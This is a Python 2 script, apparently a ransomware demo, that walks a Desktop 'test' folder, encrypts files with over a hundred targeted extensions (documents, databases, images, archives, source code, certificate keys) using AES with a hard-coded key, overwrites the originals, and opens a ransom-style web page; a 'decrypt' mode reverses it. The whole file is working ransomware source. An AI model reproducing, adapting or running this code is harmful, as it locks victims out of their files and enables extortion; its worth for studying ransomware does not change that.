import os, random, struct, sys, webbrowser, getpass
from Crypto.Cipher import AES

global key
global startPath
global ext

key  = 'This is a key123'

startPath = "C:\\Users\\"+getpass.getuser()+"\\Desktop\\test"
ext = [
    '.txt', '.pdf', '.iso', '.mid', '.wma', '.flv', '.mkv', '.mov', '.avi',
    '.asf', '.mpeg', '.vob', '.mpg', '.wmv', '.fla', '.swf', '.wav', '.qcow2',
    '.vdi', '.vmdk', '.vmx', '.gpg', '.aes', '.ARC', '.PAQ', '.tar.bz2', '.tbk',
    '.bak', '.tar', '.tgz', '.rar', '.zip', '.djv', '.djvu', '.svg', '.bmp',
    '.png', '.gif', '.raw', '.cgm', '.jpeg', '.jpg', '.tif', '.tiff', '.NEF',
    '.psd', '.cmd', '.class', '.jar', '.java', '.asp', '.brd', '.sch', '.dch',
    '.dip', '.vbs', '.asm', '.pas', '.cpp', '.php', '.ldf', '.mdf', '.ibd',
    '.MYI', '.MYD', '.frm', '.odb', '.dbf', '.mdb', '.sql', '.SQLITEDB',
    '.SQLITE3', '.asc', '.lay6', '.lay', '.ms11', '.sldm', '.sldx', '.ppsm',
    '.ppsx', '.ppam', '.docb', '.mml', '.sxm', '.otg', '.odg', '.uop', '.potx',
    '.potm', '.pptx', '.pptm', '.std', '.sxd', '.pot', '.pps', '.sti', '.sxi',
    '.otp', '.odp', '.wks', '.xltx', '.xltm', '.xlsx', '.xlsm', '.xlsb', '.slk',
    '.xlw', '.xlt', '.xlm', '.xlc', '.dif', '.stc', '.sxc', '.ots', '.ods',
    '.hwp', '.dotm', '.dotx', '.docm', '.docx', '.DOT', '.max', '.xml', '.txt',
    '.CSV', '.uot', '.RTF', '.pdf', '.XLS', '.PPT', '.stw', '.sxw', '.ott',
    '.odt', '.DOC', '.pem', '.csr', '.crt', '.key', '.html', '.css',
    '.js', '.jar', '.py', '.psd', '.mp4'
]

def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
    filename, file_extension = os.path.splitext(in_filename)
    if file_extension in ext:
        if not out_filename:
            out_filename = in_filename + '.crypt'
        iv = os.urandom(16)
        encryptor = AES.new(key, AES.MODE_CBC, iv)
        filesize = os.path.getsize(in_filename)
        with open(in_filename, 'rb') as infile:
            with open(out_filename, 'wb') as outfile:
                outfile.write(struct.pack('<Q', filesize))
                outfile.write(iv)
                while True:
                    chunk = infile.read(chunksize)
                    if len(chunk) == 0:
                        break
                    elif len(chunk) % 16 != 0:
                        chunk += b' ' * (16 - len(chunk) % 16)
                    outfile.write(encryptor.encrypt(chunk))
        outfile.close()
        infile.close()
        try:
            os.remove(in_filename)
            os.rename(out_filename, in_filename)
        except WindowsError:
            print "WinError"

def decrypt_file(key, in_filename, out_filename=None, chunksize=24*1024):
    filename, file_extension = os.path.splitext(in_filename)
    if file_extension in ext:
        if not out_filename:
            out_filename = os.path.splitext(in_filename)[0]
        with open(in_filename, 'rb') as infile:
            origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
            iv = infile.read(16)
            decryptor = AES.new(key, AES.MODE_CBC, iv)
            with open(out_filename, 'wb') as outfile:
                while True:
                    chunk = infile.read(chunksize)
                    if len(chunk) == 0:
                        break
                    outfile.write(decryptor.decrypt(chunk))
                outfile.truncate(origsize)
        outfile.close()
        infile.close()
        try:
            os.remove(in_filename)
            os.rename(out_filename, in_filename)
        except WindowsError:
            print "WinError"

def main():
    if sys.argv[1] == "crypt":
        for root, dirs, files in os.walk(startPath, topdown=False):
            for name in files:
                myFile = os.path.join(root, name)
                try:
                    encrypt_file(key, myFile)
                    print "Encrypting " + myFile
                except IOError:
                    print "Permission denied for " + myFile
        webbrowser.open('https://whatthefix.fr/ransomeware.php')
    elif sys.argv[1] == "decrypt":
        for root, dirs, files in os.walk(startPath, topdown=False):
            for name in files:
                myFile = os.path.join(root, name)
                try:
                    decrypt_file(key, myFile)
                    print "Decrypting " + myFile
                except IOError:
                    print "Permission denied for " + myFile
    else:
        exit(0)

main()
